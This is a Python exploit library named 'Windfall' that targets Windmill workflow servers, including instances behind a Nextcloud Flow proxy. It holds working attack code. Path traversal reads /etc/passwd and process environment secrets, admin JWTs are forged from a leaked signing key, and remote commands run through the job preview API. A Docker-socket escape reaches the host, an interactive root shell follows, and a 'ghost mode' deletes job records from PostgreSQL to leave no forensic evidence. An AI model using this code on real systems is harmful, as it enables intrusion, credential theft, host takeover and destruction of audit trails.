#!/usr/bin/env python3
"""
Windfall - Common code for Windmill exploits

Shared utilities for path traversal and SQLi exploits.

Author: Chocapikk
Date: 2026-01-12
"""

import base64
import json
import os
import secrets
import string
import time
from contextlib import contextmanager
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from urllib.parse import quote

import jwt
import requests
from rich.console import Console
from rich.status import Status

console = Console()


class Progress:
    """Progress spinner that mimics pwntools log.progress() API."""
    
    def __init__(self, message: str):
        self.message = message
        self._status = Status(message, console=console)
        self._status.start()
    
    def success(self, message: str = ""):
        """Mark progress as successful."""
        self._status.stop()
        if message:
            console.print(f"[green]✓[/green] {self.message}: {message}")
        else:
            console.print(f"[green]✓[/green] {self.message}")
    
    def failure(self, message: str = ""):
        """Mark progress as failed."""
        self._status.stop()
        if message:
            console.print(f"[red]✗[/red] {self.message}: {message}")
        else:
            console.print(f"[red]✗[/red] {self.message}")
    
    def status(self, message: str):
        """Update status message."""
        self.message = f"{self.message}: {message}"
        self._status.update(self.message)
    
    def stop(self):
        """Stop the spinner."""
        self._status.stop()


class Log:
    """Logging class that mimics pwntools log API."""
    
    @staticmethod
    def progress(message: str) -> Progress:
        """Create a progress spinner."""
        return Progress(message)
    
    @staticmethod
    def success(message: str):
        """Print success message."""
        console.print(f"[green]✓[/green] {message}")
    
    @staticmethod
    def info(message: str):
        """Print info message."""
        console.print(f"[blue]ℹ[/blue] {message}")
    
    @staticmethod
    def warning(message: str):
        """Print warning message."""
        console.print(f"[yellow]⚠[/yellow] {message}")
    
    @staticmethod
    def error(message: str):
        """Print error message."""
        console.print(f"[red]✗[/red] {message}")
    
    @staticmethod
    def failure(message: str):
        """Print failure message."""
        console.print(f"[red]✗[/red] {message}")


log = Log()

requests.packages.urllib3.disable_warnings()

# API Endpoints
API_VERSION = "/version"
API_WHOAMI = "/users/whoami"
API_AUTH_LOGIN = "/auth/login"
API_WORKSPACES_LIST = "/workspaces/list"
API_WORKSPACES_CREATE = "/workspaces/create"
API_JOBS_RUN_PREVIEW = "/w/{workspace}/jobs/run/preview"
API_JOBS_GET_RESULT = "/w/{workspace}/jobs_u/completed/get_result/{job_id}"
API_GET_LOG_FILE = "/w/{workspace}/jobs_u/get_log_file/{payload}"
API_FOLDERS_CREATE = "/w/{workspace}/folders/create"
API_FOLDERS_ADDOWNER = "/w/{workspace}/folders/addowner/{folder}"
API_FOLDERS_GET = "/w/{workspace}/folders/get/{folder}"
API_FOLDERS_DELETE = "/w/{workspace}/folders/delete/{folder}"

# Paths
WINDMILL_CONFIG_PATH = "/nc_app_flow_data/windmill_users_config.json"
TEST_FILE_PASSWD = "/etc/passwd"
ENVIRON_PATHS = ["/proc/self/environ", "/proc/1/environ"]

# Config
TRAVERSAL_DEPTH = 6
POLL_ATTEMPTS = 10
POLL_DELAY = 1


class DeploymentType(Enum):
    """Windmill deployment type."""
    STANDALONE = "standalone"
    FLOW_PROXY = "flow_proxy"
    FLOW_DIRECT = "flow_direct"


@dataclass
class WindmillUser:
    email: str
    password: str
    token: str
    super_admin: bool = False


@dataclass
class Secrets:
    users: dict = field(default_factory=dict)
    superadmin_secret: str | None = None
    database_url: str | None = None
    jwt_secret: str | None = None


def forge_jwt_token(jwt_secret: str, email: str, workspace: str = "demo") -> str:
    """
    Forge a valid Windmill JWT token using a leaked jwt_secret.
    
    Args:
        jwt_secret: The secret key from global_settings table
        email: Email of an existing user in the database
        workspace: Workspace ID (default: "demo")
    
    Returns:
        JWT token with "jwt_" prefix ready for Authorization header
    """
    payload = {
        "email": email,
        "username": email.split("@")[0],
        "is_admin": True,
        "is_operator": False,
        "groups": ["all"],
        "folders": [],
        "label": None,
        "workspace_id": workspace,
        "workspace_ids": None,
        "exp": int(time.time()) + 86400 * 30,  # 30 days
        "job_id": None,
        "scopes": None,
        "audit_span": None,
    }
    token = jwt.encode(payload, jwt_secret, algorithm="HS256")
    return f"jwt_{token}"


class WindmillBase:
    """Base class for Windmill exploits with common functionality."""
    
    # API path prefixes to try (in order)
    API_PREFIXES = [
        ("/api", DeploymentType.STANDALONE),  # Direct Windmill
        ("/api", DeploymentType.FLOW_DIRECT),  # Flow direct exposure
        ("/index.php/apps/app_api/proxy/flow/api", DeploymentType.FLOW_PROXY),  # Nextcloud proxy
    ]
    
    def __init__(self, url: str, nc_user: str = None, nc_pass: str = None, timeout: int = 30):
        self.url = url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.api_prefix = None
        self.deployment_type = None
        
        # Nextcloud credentials for proxy access
        self.nc_user = nc_user
        self.nc_pass = nc_pass
        self.nc_auth = (nc_user, nc_pass) if nc_user and nc_pass else None

    def _rand(self, n: int = 8) -> str:
        return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

    def _is_nextcloud_proxy(self) -> bool:
        """Check if we're using Nextcloud proxy path"""
        return self.deployment_type == DeploymentType.FLOW_PROXY

    def _encode_path(self, path: str) -> str:
        """
        Encode path for traversal based on deployment type.
        
        Direct Windmill/Flow: single encoding (%2F)
        Nextcloud proxy: triple encoding with safe="" (%25252F) to survive:
            Request → Nextcloud (PHP decode) → FastAPI (decode) → httpx → Windmill
        
        Note: Uses safe="" to force encoding of ALL characters (not standard triple encoding).
        Standard triple encoding would leave safe characters unencoded, but we need everything encoded.
        """
        if self._is_nextcloud_proxy():
            # Triple encode with safe="" to force encoding of ALL characters (including normally safe ones)
            # %25252F -> %252F (after PHP) -> %2F (after FastAPI) -> / (Windmill)
            return quote(quote(quote(path, safe=""), safe=""), safe="")
        else:
            # Single encode for direct access
            return quote(path, safe="")

    def _get(self, path: str, **kw) -> requests.Response | None:
        return self._req("GET", path, **kw)

    def _post(self, path: str, **kw) -> requests.Response | None:
        return self._req("POST", path, **kw)

    def _req(self, method: str, path: str, auth: bool = True, **kw) -> requests.Response | None:
        kw.setdefault("timeout", self.timeout)
        
        # Get Windmill token
        token = None
        if auth:
            token = getattr(self, 'admin_token', None) or getattr(self, 'initial_token', None)
        
        # For proxy: NC Basic auth + Windmill token via cookie (Authorization header conflicts)
        if self.nc_auth and self._is_nextcloud_proxy():
            kw.setdefault("auth", self.nc_auth)
            if token:
                kw.setdefault("cookies", {})["token"] = token
        elif token:
            # Direct access: use Authorization header
            kw.setdefault("headers", {})["Authorization"] = f"Bearer {token}"
        
        # Use detected prefix for all API paths
        if self.api_prefix and not path.startswith(self.api_prefix):
            full_path = f"{self.api_prefix}{path}"
        else:
            full_path = path
        
        response = self.session.request(method, f"{self.url}{full_path}", **kw)
        return response if response and response.ok else None

    def _detect_deployment(self) -> bool:
        """Auto-detect deployment type and API endpoint."""
        p = log.progress("Detecting deployment")
        
        for prefix, deployment_type in self.API_PREFIXES:
            is_proxy = deployment_type == DeploymentType.FLOW_PROXY
            
            # Try /api/version first (may require auth for proxy)
            request_kwargs = {"timeout": self.timeout, "verify": False}
            if is_proxy and self.nc_auth:
                request_kwargs["auth"] = self.nc_auth
            
            response = self.session.get(f"{self.url}{prefix}{API_VERSION}", **request_kwargs)
            if response and response.ok and any(pattern in response.text for pattern in ["v1.", "CE ", "EE "]):
                self.api_prefix = prefix
                self.deployment_type = deployment_type
                
                version = response.text.strip().strip('"')
                mode_name = {
                    DeploymentType.STANDALONE: "Windmill standalone",
                    DeploymentType.FLOW_DIRECT: "Flow (direct)",
                    DeploymentType.FLOW_PROXY: "Flow (Nextcloud proxy)"
                }[deployment_type]
                p.success(f"{mode_name} - {version}")
                return True
            
            # /api/version may require auth (ADMIN) or be rate-limited, but vulnerable endpoint is PUBLIC
            # Try path traversal directly to detect with common workspaces (NO auth needed - public endpoint)
            traversal = "../" * TRAVERSAL_DEPTH + "etc/passwd"
            # Temporarily set deployment type for encoding
            self.api_prefix = prefix
            self.deployment_type = deployment_type
            encoded = self._encode_path(traversal)
            
            # Path traversal endpoint is PUBLIC - don't use auth even for proxy
            traversal_kwargs = {"timeout": self.timeout, "verify": False}
            
            # Try common workspace names (Flow uses "nextcloud", standalone uses "_" for global)
            for ws in ["nextcloud", "_"]:
                test_url = f"{self.url}{prefix}{API_GET_LOG_FILE.format(workspace=ws, payload=encoded)}"
                response = self.session.get(test_url, **traversal_kwargs)
                if response and response.ok and "root:" in response.text:
                    self.detected_workspace = ws  # Store working workspace
                    mode_name = {
                        DeploymentType.STANDALONE: "Windmill standalone",
                        DeploymentType.FLOW_DIRECT: "Flow (direct)",
                        DeploymentType.FLOW_PROXY: "Flow (Nextcloud proxy)"
                    }[deployment_type]
                    p.success(f"{mode_name} - version unknown (detected via path traversal)")
                    return True
        
        p.failure("No valid endpoint found")
        return False

    def _get_or_create_workspace(self) -> bool:
        """Get or create a workspace."""
        if hasattr(self, 'workspace') and self.workspace:
            return True
        
        # Use workspace detected during path traversal detection
        if hasattr(self, 'detected_workspace') and self.detected_workspace:
            self.workspace = self.detected_workspace
            log.success(f"Using detected workspace: {self.workspace}")
            return True
            
        p = log.progress("Getting workspace")
        
        # Try to list existing workspaces
        r = self._get(API_WORKSPACES_LIST)
        if r:
            workspaces = r.json()
            if workspaces:
                self.workspace = workspaces[0]["id"]
                p.success(f"Using existing: {self.workspace}")
                return True
        
        # Fallback for Flow proxy without auth: use "nextcloud" (default Flow workspace)
        if self.deployment_type == DeploymentType.FLOW_PROXY:
            self.workspace = "nextcloud"
            p.success(f"Using default Flow workspace: {self.workspace}")
            return True
        
        # Create new workspace
        self.workspace = f"pwn-{self._rand(8)}"
        r = self._post(API_WORKSPACES_CREATE, json={"id": self.workspace, "name": self.workspace})
        if r:
            p.success(f"Created: {self.workspace}")
            return True
        
        p.failure("Could not get/create workspace")
        return False

    def _parse_job_result(self, response_text: str) -> str | None:
        """Parse job result from JSON string."""
        if not response_text or not response_text.strip():
            return None
        
        text = response_text.strip()
        
        # Endpoint returns JSON-encoded string, decode it
        if text.startswith('"'):
            try:
                result = json.loads(text)
                if isinstance(result, str) and result and "error" not in result.lower():
                    return result
            except (json.JSONDecodeError, ValueError):
                pass
        
        return None

    def _execute_job(self, command: str, timeout: int = 30) -> str | None:
        """Execute bash command via job preview."""
        if not self._get_or_create_workspace():
            return None
        
        # Encode command output in base64 to avoid issues with special chars/newlines
        wrapped_cmd = f"({command}) 2>&1 | base64 -w 0"
        
        payload = {
            "content": wrapped_cmd,
            "language": "bash"
        }
        
        r = self._post(API_JOBS_RUN_PREVIEW.format(workspace=self.workspace), json=payload, timeout=timeout)
        if not r:
            return None
        
        # Preview endpoint returns job_id as plain text
        job_id = r.text.strip().strip('"')
        if not job_id or len(job_id) < 10:
            return None
        
        # Track job for cleanup
        if not hasattr(self, '_job_ids'):
            self._job_ids = []
        self._job_ids.append(job_id)
        
        # Poll for result (jobs usually complete in 1-2 seconds)
        for _ in range(POLL_ATTEMPTS):
            time.sleep(POLL_DELAY)
            response = self._get(API_JOBS_GET_RESULT.format(workspace=self.workspace, job_id=job_id), timeout=timeout)
            if not response:
                continue
            
            result = self._parse_job_result(response.text)
            if result:
                # Decode base64 output
                decoded = base64.b64decode(result).decode('utf-8', errors='replace')
                return decoded
        
        return None

    def cleanup(self) -> int:
        """Delete all jobs created during this session (marks deleted, nullifies result)."""
        if not hasattr(self, '_job_ids') or not self._job_ids:
            return 0
        
        deleted = 0
        for job_id in self._job_ids:
            r = self._post(f"/w/{self.workspace}/jobs/completed/delete/{job_id}")
            if r and r.ok:
                deleted += 1
        
        self._job_ids.clear()
        return deleted

    def _parse_database_url(self, db_host: str, db_user: str, db_pass: str, db_name: str) -> tuple[str, str, str, str]:
        """Parse DATABASE_URL from secrets if available, otherwise return defaults."""
        if not (hasattr(self, 'secrets') and self.secrets.database_url):
            return db_host, db_user, db_pass, db_name
        
        try:
            from urllib.parse import urlparse, unquote
            parsed = urlparse(self.secrets.database_url)
            if parsed.scheme not in ('postgres', 'postgresql'):
                return db_host, db_user, db_pass, db_name
            
            if parsed.username:
                db_user = unquote(parsed.username)
            if parsed.password:
                db_pass = unquote(parsed.password)
            if parsed.hostname:
                db_host = unquote(parsed.hostname)
            if parsed.path:
                db_name = parsed.path.lstrip('/').split('?')[0] or db_name
        except Exception:
            pass
        
        return db_host, db_user, db_pass, db_name
    
    def _load_ghost_template(self, db_host: str, db_user: str, db_pass: str, db_name: str, job_ids: list[str] | None = None) -> str:
        """Load ghost cleanup script and inject database credentials and job IDs."""
        script_path = Path(__file__).parent / "ghost_cleanup.py"
        with open(script_path, "r") as f:
            code = f.read()
        job_ids_str = repr(job_ids or [])
        return code.replace("__DB_HOST__", db_host).replace("__DB_USER__", db_user).replace("__DB_PASS__", db_pass).replace("__DB_NAME__", db_name).replace("[]  # __JOB_IDS__", job_ids_str)
    
    def _wait_for_cleanup_result(self, job_id: str) -> int:
        """Wait for ghost cleanup workflow to complete and return deleted count."""
        for _ in range(10):
            time.sleep(0.5)
            result = self._get(API_JOBS_GET_RESULT.format(workspace=self.workspace, job_id=job_id))
            if not result or not result.text or result.text == 'null':
                continue
            
            log.info(f"Ghost cleanup workflow response: {result.text}")
            try:
                parsed = json.loads(result.text)
                deep_cleaned = int(parsed.get("result", 0) if isinstance(parsed, dict) else parsed)
                log.info(f"  → {deep_cleaned} jobs DELETED from database")
                return deep_cleaned
            except (ValueError, json.JSONDecodeError, TypeError) as e:
                log.warning(f"Failed to parse cleanup result: {result.text} ({e})")
                return 0
        
        log.warning(f"Ghost cleanup timeout - no result after 5s (job_id: {job_id})")
        log.info(f"  → Workflow may still be running in background")
        log.info(f"  → Jobs are DELETED directly from PostgreSQL (not just marked)")
        return 0

    def deep_cleanup(self, db_host: str = "db", db_user: str = "postgres",
                     db_pass: str = "changeme", db_name: str = "windmill") -> int:
        """Ghost mode: completely DELETE job entries from PostgreSQL.
        
        Uses raw PostgreSQL protocol (SCRAM-SHA-256) - no external dependencies.
        DELETEs all traces from v2_job and v2_job_completed tables.
        The cleanup job also erases itself. No forensic evidence remains.
        
        Tries to use leaked DATABASE_URL from secrets if available, otherwise falls back to hardcoded defaults.
        """
        if not self._get_or_create_workspace():
            return 0
        
        # Parse database credentials (use leaked DATABASE_URL if available)
        db_host, db_user, db_pass, db_name = self._parse_database_url(db_host, db_user, db_pass, db_name)
        
        # Get job IDs to delete (before clearing them)
        job_ids = list(self._job_ids) if hasattr(self, '_job_ids') else []
        
        # Mark jobs as deleted first (via API)
        regular_cleaned = self.cleanup()
        
        # Load and render ghost cleanup template with job IDs
        python_code = self._load_ghost_template(db_host, db_user, db_pass, db_name, job_ids)
        
        # Submit cleanup workflow
        payload = {"content": python_code, "language": "python3"}
        r = self._post(API_JOBS_RUN_PREVIEW.format(workspace=self.workspace), json=payload, timeout=30)
        if not r:
            return regular_cleaned
        
        cleanup_job_id = r.text.strip().strip('"')
        deep_cleaned = self._wait_for_cleanup_result(cleanup_job_id)
        
        # Note: The cleanup job self-destructs from v2_job, but remains in v2_job_completed
        # This is acceptable - it's a minimal trace that doesn't reveal exploit details
        # Marking it as deleted would create an infinite loop (next cleanup would delete it, creating new cleanup job, etc.)
        
        return regular_cleaned + deep_cleaned

    # ==================== Host Escape ====================

    def _get_docker_image(self) -> str | None:
        """Get available Docker image for container escape."""
        check = self._execute_job(
            "test -S /var/run/docker.sock && "
            "docker images --format '{{.Repository}}:{{.Tag}}' | grep -i windmill | head -1"
        )
        if not check:
            return None
        
        # Extract image name
        image = check.strip().split('\n')[-1]
        if 'windmill' in image.lower() and ':' in image:
            return image.strip()
        
        # Fallback: alpine (minimal, usually cached)
        return "alpine"

    def rce(self, cmd: str, host: bool = False) -> str | None:
        """Execute command via Windmill's job preview.
        
        Args:
            cmd: Command to execute
            host: If True, escape container and run on host via Docker socket
        """
        # Check for any valid token (admin_token for AFR, initial_token for SQLi)
        token = getattr(self, 'admin_token', None) or getattr(self, 'initial_token', None)
        if not token:
            log.error("No authentication token available")
            return None
        
        if host:
            docker_image = self._get_docker_image()
            if not docker_image:
                log.error("No Docker socket available for host escape")
                return None
            
            # Base64 encode command to avoid escaping issues
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            
            # Docker socket escape: create privileged container with host PID namespace
            cmd = (
                f"docker run --rm --privileged --pid=host {docker_image} "
                f"nsenter -t 1 -m -u -n -i sh -c 'echo {b64_cmd}|base64 -d|sh'"
            )
        
        return self._execute_job(cmd)


@contextmanager
def auto_cleanup(exploit, enabled: bool = True):
    """Context manager for automatic job cleanup (ghost mode).
    
    Completely DELETEs all job traces from PostgreSQL.
    No forensic evidence remains.
    
    Usage:
        with auto_cleanup(exploit, args.clean):
            exploit.rce("id")
    """
    try:
        yield
    finally:
        if enabled:
            deleted = exploit.deep_cleanup()
            if deleted:
                log.success(f"Cleaned {deleted} job(s) 👻")
                log.info(f"Ghost mode: All job traces DELETED from PostgreSQL (zero forensic evidence)")
            else:
                log.warning("Ghost mode: No jobs found to clean (or cleanup failed)")
            # Note: Uses leaked DATABASE_URL if available, otherwise hardcoded defaults


def interactive_shell(rce_func, hostname: str = "windmill", is_host: bool = False):
    """Interactive shell with history support.
    
    Args:
        rce_func: Function that takes a command string and returns output
        hostname: Hostname to display in prompt
        is_host: If True, show "host" label instead of "container"
    """
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.history import InMemoryHistory
        from prompt_toolkit.formatted_text import HTML
        
        history = InMemoryHistory()
        session = PromptSession(history=history)
        prompt_text = HTML(f'<ansired>root@{hostname}</ansired># ')
        use_prompt_toolkit = True
    except ImportError:
        use_prompt_toolkit = False
        prompt_text = f"\033[91mroot@{hostname}\033[0m# "
    
    target = "host" if is_host else "container"
    log.info(f"Interactive shell ({target}) - type 'exit' to quit")
    
    while True:
        try:
            if use_prompt_toolkit:
                cmd = session.prompt(prompt_text).strip()
            else:
                cmd = input(prompt_text).strip()
            
            if not cmd or cmd == "exit":
                break
            if output := rce_func(cmd):
                print(output)
        except (EOFError, KeyboardInterrupt):
            print()
            break
